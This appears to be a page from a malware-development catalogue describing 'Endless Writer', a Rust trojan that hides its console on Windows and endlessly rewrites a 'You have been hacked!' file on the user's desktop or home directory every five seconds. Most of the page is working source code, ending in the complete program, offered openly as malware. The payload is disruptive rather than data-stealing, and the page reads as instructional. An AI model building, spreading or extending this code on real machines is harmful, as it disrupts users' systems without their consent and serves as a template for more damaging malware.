---
title: "Endless Writer"
description: "Endless Writer is a simple malware coded in Rust that writes a message to a file on the user's desktop every 5 seconds."
date: 2025-01-07
categories: [
    Malware,
    Trojan,
    Disruptive,
]
tags: [
    _mw_trojan,
    _mw_cross-platform,
    _rust_file-system-operations,
]
# layout: default
---

| Malware | Endless Writer |
|---------|----------------|
| Type    | Trojan         |
| Function| File System Operations|
| OS      | Cross Platform |
| Language| Rust           |
| Behavior| `disruptive`   |
| Attack Delivery | Not Applicable |

## 1. Development

### 1.1. Obtaining the target directory

We use `PathBuf` and not just `std::env::var("-homve variable-".unwrap())` as PathBuf treats the obtained path as a path and not just a string. This allows us to use the join method to append the file name to the path.

Cross platform functionality is obtained using the `cfg!` macro. This allows us to check the target operating system and use the appropriate environment variable to get the home directory.

```rust
fn get_target_dir() -> PathBuf{
    let home_dir = if cfg!(target_os = "windows") {
        PathBuf::from(std::env::var("USERPROFILE").unwrap())
    } else {
        PathBuf::from(std::env::var("HOME").unwrap())
    };
    
    let desktop_dir = home_dir.join("Desktop");
    if Path::new(&desktop_dir).exists() && Path::new(&desktop_dir).is_dir() {
        return desktop_dir;
    }
    return home_dir;
}
```

The home directory is used as a fallback if the desktop directory does not exist. This is relevant for systems without a desktop environment.

### 1.2. Writing to the file

The `OpenOptions` struct is used to open the file. The `write` method is used to overwrite the file if it exists. The `create` method is used to create the file if it does not exist.

```rust
loop {
    match OpenOptions::new()
    .write(true)// Overwrite the file
    //.append(true)// append to the file
    .create(true)
    .open(&target_file){
        Ok(mut file) => {
            if let Err(e) = writeln!(file, "{}", MESSAGE){
                eprintln!("Error: {}", e);
            }
        }
        Err(e) => {
            eprintln!("Error: {}", e);
        }
    }
    sleep(Duration::from_secs(5)); // Pause for 5 seconds
}
```

This functionality is within a loop that runs indefinitely. The `sleep` function is used to pause the program for 5 seconds before writing to the file again. This minimizes resource usage.

### Results
- The console is hidden on windows due to the `#![windows_subsystem = "windows"]` attribute.
![Windows Execution](assets/malware/cross_platform/trojan/endless_writer/win-final.png)
- File re-appears every 5 seconds after deletion.
![Video showing the behavior of the Endless Writer Trojan on Linux.](assets/malware/cross_platform/trojan/endless_writer/lin-final.gif)

## Final Code
```rust
#![windows_subsystem = "windows"]

use std::{
    fs::OpenOptions, io::Write, path::{
        Path, 
        PathBuf
    }, thread::sleep, time::Duration
};

const MESSAGE: &str = "You have been hacked!";

fn get_target_dir() -> PathBuf{
    let home_dir = if cfg!(target_os = "windows") {
        PathBuf::from(std::env::var("USERPROFILE").unwrap())
    } else {
        PathBuf::from(std::env::var("HOME").unwrap())
    };
    
    let desktop_dir = home_dir.join("Desktop");
    if Path::new(&desktop_dir).exists() && Path::new(&desktop_dir).is_dir() {
        return desktop_dir;
    }
    return home_dir;
}
fn main() {
    let target_dir= get_target_dir();
    println!("{:?}", target_dir);
    let target_file = target_dir.join("hacked.txt");
    println!(
        "Writing malicious message to {}", // will still output to the console on other platforms
        target_file.display()
    );
    loop {
        match OpenOptions::new()
        .write(true)// Overwrite the file
        //.append(true)// append to the file
        .create(true)
        .open(&target_file){
            Ok(mut file) => {
                if let Err(e) = writeln!(file, "{}", MESSAGE){
                    eprintln!("Error: {}", e);
                }
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
        sleep(Duration::from_secs(5)); // Pause for 5 seconds
    }
}
```